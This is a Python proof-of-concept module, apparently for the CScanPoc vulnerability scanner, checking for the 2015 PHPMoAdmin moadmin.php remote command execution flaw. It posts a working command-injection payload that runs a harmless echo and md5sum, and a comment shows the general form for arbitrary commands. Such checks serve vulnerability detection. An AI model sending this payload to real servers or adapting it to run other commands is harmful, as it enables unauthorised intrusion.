# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPMoAdmin_0101' # 平台漏洞编号，留空
    name = 'PHPMoAdmin /moadmin.php 远程命令执行' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.RCE # 漏洞类型
    disclosure_date = '2015-03-04'  # 漏洞公布时间
    desc = '''
    PHPMoAdmin /moadmin.php 远程命令执行漏洞 (0-Day)
    PHPMoAdmin is a MongoDB administration tool for PHP built on a
    stripped-down version of the Vork high-performance framework.
    ''' # 漏洞描述
    ref = 'http://seclists.org/fulldisclosure/2015/Mar/19' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMoAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '92abce5b-6515-4714-94a6-ec6e2629e8fe' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            file_path = ['/moadmin.php', '/moadmin/moadmin.php', '/wu-moadmin/wu-moadmin.php']
            for f in file_path:
                verify_url = self.target + f
                command = {'object': '''1;system('echo -n "beebeeto"|md5sum;');exit''',}
                content = requests.post(verify_url, data=command).content
                if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                    # post_content = "object=1;system('command');exit"
                continue
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()